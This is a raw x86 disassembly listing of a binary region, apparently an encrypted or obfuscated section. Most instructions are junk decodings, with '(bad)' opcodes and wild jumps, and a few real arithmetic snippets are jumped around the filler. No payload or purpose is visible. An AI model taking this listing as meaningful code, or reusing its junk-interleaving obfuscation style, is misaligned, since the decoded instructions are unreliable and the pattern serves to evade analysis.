  40cf5e:	bound  esi,QWORD PTR [edi-0x3c]
  40cf61:	dec    esp
  40cf62:	outs   dx,BYTE PTR ds:[esi]
  40cf63:	push   ebp
  40cf64:	aaa    
  40cf65:	repz adc BYTE PTR [edi-0x664dc86f],bl
  40cf6c:	mov    ebx,ecx
  40cf6e:	(bad)  
  40cf6f:	stos   DWORD PTR es:[edi],eax
  40cf70:	sub    DWORD PTR [edi-0x189b50b7],edi
  40cf76:	pop    ds
  40cf77:	enter  0x6af4,0x7d
  40cf7b:	cli    
  40cf7c:	cmp    eax,0xe3524d08
  40cf81:	sub    esp,edi
  40cf83:	daa    
  40cf84:	inc    DWORD PTR [edx+ecx*2-0x27a3620f]
  40cf8b:	shl    BYTE PTR [ecx+0x16],0xe6
  40cf8f:	lahf   
  40cf90:	fidiv  WORD PTR [ebp+0x17804aa6]
  40cf96:	ror    DWORD PTR [esi],0x65
  40cf99:	mov    cl,0x86
  40cf9b:	push   ss
  40cf9c:	aaa    
  40cf9d:	pcmpgtd mm3,QWORD PTR [edx+0x64f10252]
  40cfa4:	loopne 0x40cf45
  40cfa6:	rcl    DWORD PTR [edx+0x530ef676],cl
  40cfac:	jno    0x40cf2f
  40cfae:	xor    al,0x1c
  40cfb0:	inc    ebx
  40cfb1:	xchg   ebp,eax
  40cfb2:	add    bl,BYTE PTR [eax+0x76]
  40cfb5:	es jbe 0x40d031
  40cfb8:	xchg   edx,eax
  40cfb9:	std    
  40cfba:	sbb    dh,BYTE PTR [ebx]
  40cfbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfbd:	inc    edx
  40cfbe:	inc    edx
  40cfbf:	pop    ds
  40cfc0:	pop    edx
  40cfc1:	scas   eax,DWORD PTR es:[edi]
  40cfc2:	xchg   BYTE PTR [ebx-0x5b],dl
  40cfc5:	mov    al,0x13
  40cfc7:	or     DWORD PTR ds:0x87795bdd,ebx
  40cfcd:	in     al,0xe7
  40cfcf:	popa   
  40cfd0:	sbb    BYTE PTR [ecx-0x13e5efe4],al
  40cfd6:	ja     0x40d02b
  40cfd8:	jae    0x40cfda
  40cfda:	test   DWORD PTR [eax],ecx
  40cfdc:	ins    DWORD PTR es:[edi],dx
  40cfdd:	or     BYTE PTR [ebx],dh
  40cfdf:	mov    DWORD PTR [ebx+0x41e19266],esi
  40cfe5:	test   al,0xdd
  40cfe7:	aas    
  40cfe8:	in     al,0x3f
  40cfea:	adc    DWORD PTR ss:[esi+ecx*2],edx
  40cfee:	or     al,BYTE PTR [edx+0x30]
  40cff1:	cdq    
  40cff2:	scas   eax,DWORD PTR es:[edi]
  40cff3:	in     eax,dx
  40cff4:	js     0x40d033
  40cff6:	ins    DWORD PTR es:[edi],dx
  40cff7:	pop    eax
  40cff8:	add    eax,DWORD PTR [ebp+0x363d196b]
  40cffe:	pop    esi
  40cfff:	neg    DWORD PTR [esi+eiz*1+0xa]
  40d003:	sub    DWORD PTR [edx-0x7d8903d3],ebx
  40d009:	iret   
  40d00a:	adc    ah,BYTE PTR [esp+ebx*2-0x23]
  40d00e:	(bad)  
  40d00f:	dec    edi
  40d010:	(bad)  
  40d011:	retf   
  40d012:	xchg   esp,eax
  40d013:	and    al,0xff
  40d015:	shr    BYTE PTR [ecx+ecx*8],0xa
  40d019:	ins    BYTE PTR es:[edi],dx
  40d01a:	add    esi,DWORD PTR [eax-0x3b955ca6]
  40d020:	mov    ecx,0x6e29794f
  40d025:	jb     0x40cfb5
  40d027:	call   FWORD PTR [esi+0x3b67feec]
  40d02d:	xor    edi,DWORD PTR [edx]
  40d02f:	icebp  
  40d030:	enter  0xc142,0x22
  40d034:	rcl    esi,1
  40d036:	push   esi
  40d037:	mov    ecx,0x5c80a652
  40d03c:	cld    
  40d03d:	ds hlt 
  40d03f:	popf   
  40d040:	mov    esi,0x48b0f2f1
  40d045:	inc    esp
  40d046:	xchg   esp,eax
  40d047:	pop    esi
  40d048:	inc    edx
  40d049:	pop    ds
  40d04a:	cmp    esi,DWORD PTR [eax-0x31]
  40d04d:	js     0x40d017
  40d04f:	push   esi
  40d050:	sub    DWORD PTR [esi+0x132dcc81],ebx
  40d056:	xchg   edi,eax
  40d057:	push   ds
  40d058:	pop    ecx
  40d059:	and    si,WORD PTR [ebx-0x7de2ebd7]
  40d060:	stos   BYTE PTR es:[edi],al
  40d061:	sti    
  40d062:	dec    ebx
  40d063:	mov    ebx,0x1f9a66ae
  40d068:	mov    WORD PTR [eax-0x12],es
  40d06b:	mov    WORD PTR [edx+0x4c],fs
  40d06e:	(bad)  
  40d06f:	jg     0x40d095
  40d071:	idiv   dl
  40d073:	sbb    bh,BYTE PTR ds:0x5c7a25f0
  40d079:	fs iret 
  40d07b:	ret    0x357d
  40d07e:	loope  0x40d0fe
  40d080:	(bad)  [edi]
  40d082:	lods   eax,DWORD PTR ds:[esi]
  40d083:	retf   0x7b7e
  40d086:	call   0x17d:0xb5ccef1d
  40d08d:	mov    WORD PTR [ebx-0x5166fc30],cs
  40d093:	dec    edi
  40d094:	and    dh,BYTE PTR [ebp-0x2e]
  40d097:	mov    cl,0x81
  40d099:	ret    0x995b
  40d09c:	jmp    0x40d0fb
  40d09e:	and    DWORD PTR [ebp-0x49],esi
  40d0a1:	mov    bh,0x74
  40d0a3:	je     0x40d0fe
  40d0a5:	test   eax,0x1f633352
  40d0aa:	in     eax,0x10
  40d0ac:	(bad)  
  40d0ad:	xor    BYTE PTR [ecx],al
  40d0af:	push   0x5c2f8d6a
  40d0b4:	cmp    bh,BYTE PTR [eax]
  40d0b6:	les    esi,FWORD PTR [edi+0x4]
  40d0b9:	xchg   BYTE PTR [edx],dl
  40d0bb:	dec    ebp
  40d0bc:	jb     0x40d09d
  40d0be:	jmp    0x40d13d
  40d0c0:	fnstsw WORD PTR [edx-0x49]
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	vfmsub231sd xmm5,xmm4,xmm5
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0f9
  40d0fb:	out    0x92,eax
  40d0fd:	inc    ebx
  40d0fe:	mov    al,ds:0xa886c594
  40d103:	pop    ecx
  40d104:	pushf  
  40d105:	aad    0x2a
  40d107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d108:	xchg   edx,eax
  40d109:	push   ebp
  40d10a:	loopne 0x40d12d
  40d10c:	inc    edi
  40d10d:	mov    al,ds:0x1950896d
  40d112:	pusha  
  40d113:	mov    esp,0x1cb6414f
  40d118:	fwait
  40d119:	jmp    0x1f0b906c
  40d11e:	popa   
  40d11f:	test   DWORD PTR [ebx-0x3364cc07],esi
  40d125:	pop    es
  40d126:	cmp    al,0xb6
  40d128:	xchg   BYTE PTR [ecx+0x5b],bh
  40d12b:	ins    DWORD PTR es:[edi],dx
  40d12c:	das    
  40d12d:	fdivp  st(7),st
  40d12f:	xor    al,BYTE PTR [ebx+0x3fd92422]
  40d135:	jp     0x40d0b9
  40d137:	adc    BYTE PTR [esi+0x38],al
  40d13a:	lods   eax,DWORD PTR ds:[esi]
  40d13b:	xor    al,BYTE PTR [edi]
  40d13d:	mov    cl,BYTE PTR [eax]
  40d13f:	sbb    eax,DWORD PTR [edx]
  40d141:	xchg   edx,eax
  40d142:	enter  0xb001,0x42
  40d146:	inc    eax
  40d147:	push   edi
  40d148:	mov    esp,ds
  40d14a:	imul   esi,eax,0x36a9d474
  40d150:	in     eax,0xe0
  40d152:	lahf   
  40d153:	repz hlt 
  40d155:	inc    BYTE PTR [esi]
  40d157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d158:	jnp    0x40d11e
  40d15a:	and    ah,0x35
  40d15d:	mov    al,0x57
  40d15f:	icebp  
  40d160:	pop    ss
  40d161:	imul   esp,esp,0x4272c65c
  40d167:	mov    bl,0xd6
  40d169:	xor    BYTE PTR [esp+edi*2],cl
  40d16c:	add    edi,ebx
  40d16e:	inc    ebp
  40d16f:	lods   eax,DWORD PTR ds:[esi]
  40d170:	loop   0x40d1d9
  40d172:	push   ds
  40d173:	enter  0x6072,0x29
  40d177:	pop    ecx
  40d178:	xor    BYTE PTR [esi+0x44],dl
  40d17b:	jnp    0x40d157
  40d17d:	mov    dl,0x3
  40d17f:	in     al,dx
  40d180:	jge    0x40d1b9
  40d182:	sub    ch,BYTE PTR [esp+edi*4-0x7e]
  40d186:	sub    eax,0xfb63a461
  40d18b:	retf   
  40d18c:	push   eax
  40d18d:	mov    dl,0xad
  40d18f:	or     eax,0x561f5456
  40d194:	pop    ecx
  40d195:	(bad)  
  40d196:	fisttp WORD PTR [edx+0x360a5660]
  40d19c:	pop    ecx
  40d19d:	les    ecx,FWORD PTR [esi+edx*4+0x115da03e]
  40d1a4:	dec    eax
  40d1a5:	xchg   edi,eax
  40d1a6:	mov    dh,0x7
  40d1a8:	push   esi
  40d1a9:	repz test ecx,ecx
  40d1ac:	lock or esi,0x5cdb26b
  40d1b3:	mov    dh,0xb4
  40d1b5:	mov    ds:0xf69a4798,eax
  40d1ba:	fcmovb st,st(5)
  40d1bc:	push   edx
  40d1bd:	jg     0x40d203
  40d1bf:	call   0x7eff:0x292763f8
  40d1c6:	in     eax,dx
  40d1c7:	jmp    0xb8348d3e
  40d1cc:	aam    0x59
  40d1ce:	ror    ch,0x51
  40d1d1:	mov    bl,0x8d
  40d1d3:	mov    DWORD PTR [esi-0x65],esp
  40d1d6:	mov    edx,0xcae670dd
  40d1db:	(bad)  
  40d1dc:	mov    ds:0x524dbb5d,al
  40d1e1:	(bad)  
  40d1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1e3:	jle    0x40d180
  40d1e5:	lods   al,BYTE PTR ds:[esi]
  40d1e6:	dec    esp
  40d1e7:	iret   
  40d1e8:	adc    DWORD PTR [esi+edx*1],edx
  40d1eb:	not    DWORD PTR [ebp*2-0x76f24382]
  40d1f2:	in     al,dx
  40d1f3:	jno    0x40d1ca
  40d1f5:	popf   
  40d1f6:	das    
  40d1f7:	dec    ecx
  40d1f8:	pop    ebx
  40d1f9:	xchg   esi,eax
  40d1fa:	inc    ebx
  40d1fb:	je     0x40d254
  40d1fd:	inc    esi
  40d1fe:	ins    DWORD PTR es:[edi],dx
  40d1ff:	fmulp  st(2),st
  40d201:	loop   0x40d1d6
  40d203:	dec    ebx
  40d204:	xor    eax,0x42604dab
  40d209:	ret    0xba45
  40d20c:	xor    al,0x4f
  40d20e:	ins    BYTE PTR es:[edi],dx
  40d20f:	hlt    
  40d210:	mov    ebx,0x87795c81
  40d215:	jns    0x40d19c
  40d217:	pop    ds
  40d218:	lock add al,0x68
  40d21b:	sub    ch,BYTE PTR [ecx-0x53]
  40d21e:	pop    es
  40d21f:	aad    0xdd
  40d221:	xchg   edx,eax
  40d222:	out    0xe8,al
  40d224:	sub    BYTE PTR [ecx+0x706c5868],ah
  40d22a:	xchg   esi,eax
  40d22b:	iret   
  40d22c:	pop    esp
  40d22d:	dec    ebp
  40d22e:	inc    ebx
  40d22f:	jg     0x40d216
  40d231:	mov    esi,gs
  40d233:	push   ecx
  40d234:	push   ebx
  40d235:	add    al,0x9e
  40d237:	adc    DWORD PTR [edi],esi
  40d239:	adc    DWORD PTR [ecx-0x5da06f95],esi
  40d23f:	sbb    al,0xf9
  40d241:	dec    ebp
  40d242:	xor    eax,0x7aa09e91
  40d247:	xor    al,0x1e
  40d249:	shr    BYTE PTR [esi+0x627e2cb0],cl
  40d24f:	jbe    0x40d1f1
  40d251:	mov    ah,BYTE PTR [ebp-0x1c03d903]
  40d257:	mov    ch,0xdf
  40d259:	into   
  40d25a:	sbb    BYTE PTR [esi],bl
  40d25c:	sar    DWORD PTR [edx],0x1
  40d25f:	mov    edx,0xa7d90935
  40d264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d265:	xor    BYTE PTR [eax],dh
  40d267:	mov    BYTE PTR [ebp-0x421636d0],dl
  40d26d:	push   cs
  40d26e:	dec    edx
  40d26f:	xor    ah,dh
  40d271:	cmp    eax,0x7af88ac9
  40d276:	mov    edi,0x9a9cbdea
  40d27b:	or     al,0x15
  40d27d:	je     0x40d232
  40d27f:	xchg   ebp,eax
  40d280:	mov    ?,WORD PTR [edx-0x2211489c]
  40d286:	or     ch,BYTE PTR [edx-0x48fee9b1]
  40d28c:	out    dx,al
  40d28d:	ror    BYTE PTR [esi-0x12],0x12
  40d291:	call   0xb1c99f82
  40d296:	xor    eax,0x56f874e8
  40d29b:	mov    dl,0x5d
  40d29d:	addr16 test al,0x8a
  40d2a0:	xchg   ebx,eax
  40d2a1:	(bad)  
  40d2a2:	jg     0x40d285
  40d2a4:	pop    ds
  40d2a5:	mov    ebp,0xa9687eb
  40d2aa:	cwde   
  40d2ab:	jmp    0xe2fb:0xc1e51bc2
  40d2b2:	or     ecx,ecx
  40d2b4:	jo     0x40d2c2
  40d2b6:	pop    ecx
  40d2b7:	mov    ebp,0x9ca55c98
  40d2bc:	test   al,0x12
  40d2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2bf:	lahf   
  40d2c0:	add    eax,0x8cb3631b
  40d2c5:	out    dx,eax
  40d2c6:	sbb    ah,BYTE PTR [edx-0x8]
  40d2c9:	es ja  0x40d311
  40d2cc:	jmp    FWORD PTR [ebx+0x1256e5dd]
  40d2d2:	das    
  40d2d3:	outs   dx,DWORD PTR ds:[esi]
  40d2d4:	leavew 
  40d2d6:	push   edx
  40d2d7:	bound  edx,QWORD PTR [esi+0x361a0f20]
  40d2dd:	lods   al,BYTE PTR ds:[esi]
  40d2de:	popa   
  40d2df:	mov    ecx,0xc4e41929
  40d2e4:	dec    esp
  40d2e5:	bound  ecx,QWORD PTR [ecx+0x61]
  40d2e8:	xchg   esp,eax
  40d2e9:	loop   0x40d30c
  40d2eb:	sbb    al,0xe7
  40d2ed:	lods   al,BYTE PTR ds:[esi]
  40d2ee:	sub    DWORD PTR [edi-0x6e],ebx
  40d2f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2f2:	jl     0x40d2b2
  40d2f4:	xor    dl,dl
  40d2f6:	fisub  WORD PTR [ecx-0x23]
  40d2f9:	sbb    ebp,esi
  40d2fb:	sbb    DWORD PTR [esi-0xbb4693],0x34
  40d302:	xchg   ebp,eax
  40d303:	fprem1 
  40d305:	int    0x45
  40d307:	adc    DWORD PTR [ebx+0x57d057b1],esp
  40d30d:	mov    eax,0xf255ca59
  40d312:	(bad)  
  40d313:	(bad)  
  40d314:	add    BYTE PTR [ecx-0xd],dl
  40d317:	mov    ch,0xed
  40d319:	fild   DWORD PTR [ecx-0x27]
  40d31c:	aas    
  40d31d:	jecxz  0x40d30a
  40d31f:	cmp    al,0xa0
  40d321:	sub    ecx,DWORD PTR [eax+edx*8-0x19]
  40d325:	(bad)  
  40d326:	pop    ebp
  40d327:	inc    ecx
  40d328:	or     eax,0x8753a6a7
  40d32d:	add    bl,al
  40d32f:	lods   al,BYTE PTR ds:[esi]
  40d330:	inc    esp
  40d331:	fs cdq 
  40d333:	mov    ch,0x1a
  40d335:	cli    
  40d336:	adc    ecx,eax
  40d338:	sbb    eax,0x9bb9dc10
  40d33d:	sub    al,0xde
  40d33f:	mov    bl,0xf6
  40d341:	mov    ebx,0x63bbd155
  40d346:	inc    esi
  40d347:	data16 cld 
  40d349:	or     esp,0xfffffff2
  40d34c:	cmp    al,BYTE PTR [eax]
  40d34e:	dec    ebp
  40d34f:	retf   0x43ba
  40d352:	out    dx,al
  40d353:	in     al,0xa6
  40d355:	and    ecx,DWORD PTR [eax-0x4d]
  40d358:	iret   
  40d359:	jno    0x40d33d
  40d35b:	jo     0x40d307
  40d35d:	or     edi,DWORD PTR [ebp-0x57]
  40d360:	push   ebx
  40d361:	push   0x97ea60
  40d366:	fwait
  40d367:	jmp    0xc79da324
  40d36c:	mov    gs,WORD PTR [eax-0x50908529]
  40d372:	out    0x15,eax
  40d374:	cmp    al,BYTE PTR [esi]
  40d376:	inc    eax
  40d377:	out    dx,eax
  40d378:	ins    DWORD PTR es:[edi],dx
  40d379:	lods   al,BYTE PTR ds:[esi]
  40d37a:	mov    al,ds:0x868e3ab8
  40d37f:	sub    al,0xd7
  40d381:	push   ebp
  40d382:	pop    ds
  40d383:	cli    
  40d384:	jns    0x40d38f
  40d386:	stos   BYTE PTR es:[edi],al
  40d387:	test   al,0x4c
  40d389:	(bad)  
  40d38a:	fstp   DWORD PTR [ecx-0x33f30191]
  40d390:	xchg   ecx,eax
  40d391:	mov    ecx,0x3b46f189
  40d396:	dec    esp
  40d397:	adc    eax,0xf3742df5
  40d39c:	inc    edx
  40d39d:	sbb    ah,al
  40d39f:	mov    bh,0x2c
  40d3a1:	push   0xffffff88
  40d3a3:	je     0x40d41d
  40d3a5:	cmp    eax,edx
  40d3a7:	(bad)  
  40d3a8:	pop    ds
  40d3a9:	xchg   ebp,eax
  40d3aa:	mov    al,0x29
  40d3ac:	je     0x40d37b
  40d3ae:	pop    ebx
  40d3af:	or     DWORD PTR [edx],esi
  40d3b1:	ja     0x40d348
  40d3b3:	dec    eax
  40d3b4:	dec    esi
  40d3b5:	mov    DWORD PTR [edx-0x31afefe9],0x31c507a5
  40d3bf:	inc    edx
  40d3c0:	xlat   BYTE PTR ds:[ebx]
  40d3c1:	cwde   
  40d3c2:	cli    
  40d3c3:	cs int 0x4
  40d3c6:	sub    dh,ch
  40d3c8:	(bad)  
  40d3c9:	push   esi
  40d3ca:	loope  0x40d396
  40d3cc:	in     al,0xd1
  40d3ce:	stc    
  40d3cf:	dec    esp
  40d3d0:	sub    BYTE PTR cs:[eax-0x332fe373],bl
  40d3d7:	retf   
  40d3d8:	fstp   DWORD PTR [ecx-0x3355fa67]
  40d3de:	adc    eax,0x6e0d2e41
  40d3e3:	cmp    cl,BYTE PTR [ebx+eiz*1]
  40d3e6:	ss dec esi
  40d3e8:	xchg   esi,eax
  40d3e9:	xor    esp,DWORD PTR [ebx-0x26]
  40d3ec:	pop    edx
  40d3ed:	pushf  
  40d3ee:	mov    ch,0xed
  40d3f0:	cs retf 0xc928
  40d3f4:	nop
  40d3f5:	ret    
  40d3f6:	adc    al,0x4a
  40d3f8:	mov    al,0x5
  40d3fa:	fild   WORD PTR [ecx-0x14]
  40d3fd:	ja     0x40d416
  40d3ff:	xlat   BYTE PTR ds:[ebx]
  40d400:	mov    edi,0x1d7bbea8
  40d405:	mov    ds:0x91ebfeaf,eax
  40d40a:	cmp    al,0xfa
  40d40c:	(bad)  
  40d40d:	fwait
  40d40e:	out    0x40,eax
  40d410:	in     al,dx
  40d411:	loope  0x40d3ee
  40d413:	out    dx,al
  40d414:	add    edi,DWORD PTR [esi]
  40d416:	mov    cl,0x0
  40d418:	sub    BYTE PTR [edi-0x74],bl
  40d41b:	sbb    DWORD PTR [eax-0x54fc76e3],0x2
  40d422:	push   edi
  40d423:	xchg   esi,esi
  40d425:	ins    BYTE PTR es:[edi],dx
  40d426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d427:	pop    esp
  40d428:	scas   al,BYTE PTR es:[edi]
  40d429:	pusha  
  40d42a:	or     DWORD PTR [ebx-0x6c421ff7],eax
  40d430:	jo     0x40d3b4
  40d432:	add    al,0x1f
  40d434:	out    dx,al
  40d435:	neg    DWORD PTR [edx]
  40d437:	mov    eax,ds:0x8710ee5
  40d43c:	fbstp  TBYTE PTR [eax]
  40d43e:	push   esp
  40d43f:	not    esi
  40d441:	xlat   BYTE PTR ds:[ebx]
  40d442:	out    0xb7,eax
  40d444:	bound  ecx,QWORD PTR [esi]
  40d446:	inc    ebp
  40d447:	fild   WORD PTR [edx]
  40d449:	and    DWORD PTR [ecx+0x203d6dce],esi
  40d44f:	mov    cs,WORD PTR [ebp-0x65]
  40d452:	xchg   edi,eax
  40d453:	jns    0x40d43b
  40d455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d456:	sahf   
  40d457:	jae    0x40d486
  40d459:	push   ax
  40d45b:	test   BYTE PTR [ebx],al
  40d45d:	adc    al,0x4e
  40d45f:	or     al,0x69
  40d461:	jnp    0x40d412
  40d463:	loopne 0x40d3f9
  40d465:	mov    bl,BYTE PTR ds:0x6a4e5b26
  40d46b:	repz std 
  40d46d:	mov    esi,0x417943f9
  40d472:	out    dx,al
  40d473:	fstp   DWORD PTR [edi-0x3e]
  40d476:	dec    esp
  40d477:	jne    0x40d4df
  40d479:	fcom   QWORD PTR [esi-0x3180c046]
  40d47f:	adc    esi,DWORD PTR [edx+ebx*8]
  40d482:	or     eax,0x47b8ff8d
  40d487:	leave  
  40d488:	test   ebp,0xdc0781bf
  40d48e:	aad    0x46
  40d490:	mov    ebp,ebp
  40d492:	cmp    bh,BYTE PTR [ebp+0x7ebf7777]
  40d498:	(bad)  
  40d499:	lods   eax,DWORD PTR ds:[esi]
  40d49a:	jno    0x40d427
  40d49c:	jge    0x40d496
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x88d3:0xb81a1d63
  40d4c6:	xchg   edi,eax
  40d4c7:	add    eax,0x7099c949
  40d4cc:	jo     0x40d46d
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4d8
  40d4d2:	ds ror cl,cl
  40d4d5:	daa    
  40d4d6:	cwde   
  40d4d7:	jecxz  0x40d52e
  40d4d9:	pop    ebp
  40d4da:	pop    eax
  40d4db:	xchg   DWORD PTR [esi],eax
  40d4dd:	outs   dx,DWORD PTR ds:[esi]
  40d4de:	adc    al,0xf7
  40d4e0:	ret    
  40d4e1:	push   0xffffffbd
  40d4e3:	les    edx,FWORD PTR [ecx]
  40d4e5:	sbb    bl,BYTE PTR [eax+0x15dca8bd]
  40d4eb:	in     eax,dx
  40d4ec:	sub    ecx,DWORD PTR [eax]
  40d4ee:	sti    
  40d4ef:	test   eax,0x21d3270e
  40d4f4:	xchg   sp,ax
  40d4f6:	ss jecxz 0x40d556
  40d4f9:	cdq    
  40d4fa:	jg     0x40d515
  40d4fc:	ja     0x40d54f
  40d4fe:	arpl   WORD PTR [ebx+0x7de8df9d],di
  40d504:	xchg   ebp,eax
  40d505:	inc    esi
  40d506:	call   0xfba7546c
  40d50b:	push   ecx
  40d50c:	retf   0xed8c
  40d50f:	arpl   WORD PTR [edi+0x3d39c7d7],sp
  40d515:	shl    dl,cl
  40d517:	xchg   ecx,eax
  40d518:	jge    0x40d599
  40d51a:	jp     0x40d4ed
  40d51c:	popf   
  40d51d:	jmp    0x5a27:0x7d2c631a
  40d524:	gs jmp 0x40d57e
  40d527:	or     BYTE PTR [esi],ah
  40d529:	imul   ebp,DWORD PTR [ebx-0x551bae70]
  40d530:	test   al,0xd7
  40d532:	mov    edx,0x2091ce28
  40d537:	or     eax,0xbe2491b
  40d53c:	sbb    al,0x9b
  40d53e:	mov    ch,0xe0
  40d540:	pusha  
  40d541:	rol    DWORD PTR [ebx-0x31],cl
  40d544:	xchg   edi,eax
  40d545:	xor    BYTE PTR [esi-0x4a],dl
  40d548:	cld    
  40d549:	fbstp  TBYTE PTR [eax-0x64]
  40d54c:	(bad)  
  40d54d:	xor    BYTE PTR [ebp+0x62],ch
  40d550:	iret   
  40d551:	pop    ebx
  40d552:	pop    eax
  40d553:	mov    ch,0x4f
  40d555:	push   0xfffffff0
  40d557:	jmp    0xb5995177
  40d55c:	test   DWORD PTR ds:0x7a08f0ff,esi
  40d562:	sub    cl,BYTE PTR [ebx+0x38]
  40d565:	jmp    0x459d1fd6
  40d56a:	sub    ch,BYTE PTR [eax-0x3db86b3]
  40d570:	add    esi,edx
  40d572:	and    ch,dl
  40d574:	push   0x72
  40d576:	pop    ds
  40d577:	jae    0x40d5ba
  40d579:	es loopne 0x40d535
  40d57c:	mov    ebx,DWORD PTR [ebp-0x7043e34d]
  40d582:	lods   al,BYTE PTR ds:[esi]
  40d583:	enter  0xef99,0x6a
  40d587:	shl    DWORD PTR [ebx+0x4f],cl
  40d58a:	or     dh,dh
  40d58c:	sbb    DWORD PTR [ebp-0x6e45f24b],esi
  40d592:	pop    ecx
  40d593:	or     bl,BYTE PTR [eax]
  40d595:	jb     0x40d590
  40d597:	rcr    DWORD PTR [ebx-0x1607f781],cl
  40d59d:	aas    
  40d59e:	repz adc ebx,DWORD PTR [ebp-0x52]
  40d5a2:	lock mov edi,0xf976713e
  40d5a8:	mov    fs,WORD PTR [esi]
  40d5aa:	push   cs
  40d5ab:	mov    bh,0x50
  40d5ad:	test   eax,0xeffdf9b5
  40d5b2:	cwde   
  40d5b3:	(bad)  
  40d5b4:	cmp    edi,DWORD PTR [edx+ebp*1+0x72385df2]
  40d5bb:	cmc    
  40d5bc:	call   0x388ea1a2
  40d5c1:	scas   eax,DWORD PTR es:[edi]
  40d5c2:	xor    DWORD PTR [esi+0x64],ebp
  40d5c5:	mov    eax,ds:0x28abf59f
  40d5ca:	xor    al,0xad
  40d5cc:	retf   
  40d5cd:	(bad)  
  40d5ce:	shl    BYTE PTR [ecx+0x12],0xa2
  40d5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5d3:	scas   eax,DWORD PTR es:[edi]
  40d5d4:	jmp    0x9a04b725
  40d5d9:	dec    eax
  40d5da:	pusha  
  40d5db:	call   FWORD PTR [ecx]
  40d5dd:	imul   ecx,DWORD PTR ds:0x7ced53ae,0x718fcfdc
  40d5e7:	mov    edx,ebx
  40d5e9:	pop    ebp
  40d5ea:	jne    0x40d669
  40d5ec:	mov    ebx,0x442bff1a
  40d5f1:	pop    edx
  40d5f2:	ror    edi,1
  40d5f4:	rcl    DWORD PTR [edx+0x68],0x1b
  40d5f8:	push   ecx
  40d5f9:	jnp    0x40d628
  40d5fb:	sahf   
  40d5fc:	ss stos DWORD PTR es:[edi],eax
  40d5fe:	cmp    al,0x63
  40d600:	lahf   
  40d601:	mov    bl,0x7a
  40d603:	int    0xf8
  40d605:	mov    cl,0x54
  40d607:	out    dx,al
  40d608:	es in  eax,dx
  40d60a:	push   ebp
  40d60b:	fsub   QWORD PTR [eax+0x4ea3fc4a]
  40d611:	add    edi,ecx
  40d613:	scas   eax,DWORD PTR es:[edi]
  40d614:	jae    0x40d5c3
  40d616:	and    al,0x3a
  40d618:	call   0xce3d:0xe4ccb67e
  40d61f:	aas    
  40d620:	in     eax,dx
  40d621:	cli    
  40d622:	pop    esp
  40d623:	mov    ch,0x9e
  40d625:	xor    ecx,esp
  40d627:	xchg   edx,eax
  40d628:	int3   
  40d629:	push   edi
  40d62a:	dec    esi
  40d62b:	fistp  WORD PTR [ebx-0x66]
  40d62e:	out    dx,eax
  40d62f:	dec    edi
  40d630:	outs   dx,BYTE PTR ds:[esi]
  40d631:	out    dx,eax
  40d632:	push   0x51
  40d634:	test   al,0x20
  40d636:	xchg   ebx,eax
  40d637:	mov    edi,0x7bacd8b5
  40d63c:	adc    edi,edx
  40d63e:	(bad)  
  40d63f:	fdivr  DWORD PTR [edi+0x29]
  40d642:	sub    ah,bl
  40d644:	sbb    eax,0x2105bbd0
  40d649:	and    bl,BYTE PTR [ebx-0x604f438e]
  40d64f:	retf   0x6a80
  40d652:	jmp    0xf62b248d
  40d657:	and    al,0x20
  40d659:	or     al,0xd0
  40d65b:	call   0xf570340
  40d660:	mov    ch,0x3e
  40d662:	sub    bh,BYTE PTR [esi+0x3b]
  40d665:	dec    edx
  40d666:	nop
  40d667:	pop    ds
  40d668:	popf   
  40d669:	xchg   DWORD PTR [esi+0x610a057e],edi
  40d66f:	jg     0x40d6b6
  40d671:	mov    ch,0xa3
  40d673:	sbb    edx,DWORD PTR [esi]
  40d675:	out    0x6e,al
  40d677:	jle    0x40d699
  40d679:	jmp    0x202a1caf
  40d67e:	fidivr WORD PTR [ebx+0x7c]
  40d681:	fs jmp 0x2a881f35
  40d687:	jae    0x40d65f
  40d689:	or     BYTE PTR [ebx+0x52],0xc9
  40d68d:	jmp    0x40d611
  40d68f:	adc    ebp,eax
  40d691:	adc    edi,DWORD PTR [ecx-0x3f092a70]
  40d697:	mov    ebp,0x7dbd27e9
  40d69c:	push   es
  40d69d:	jne    0x40d715
  40d69f:	add    DWORD PTR [edx-0x22],ecx
  40d6a2:	jl     0x40d673
  40d6a4:	sbb    eax,0x38cc4424
  40d6a9:	push   esp
  40d6aa:	loope  0x40d729
  40d6ac:	and    eax,0xeb28f1fc
  40d6b1:	mov    WORD PTR [edi+0x37],?
  40d6b4:	push   ebx
  40d6b5:	cmpps  xmm4,XMMWORD PTR [ebx+0x1b],0x56
  40d6ba:	mov    WORD PTR [ecx+edi*4],ds
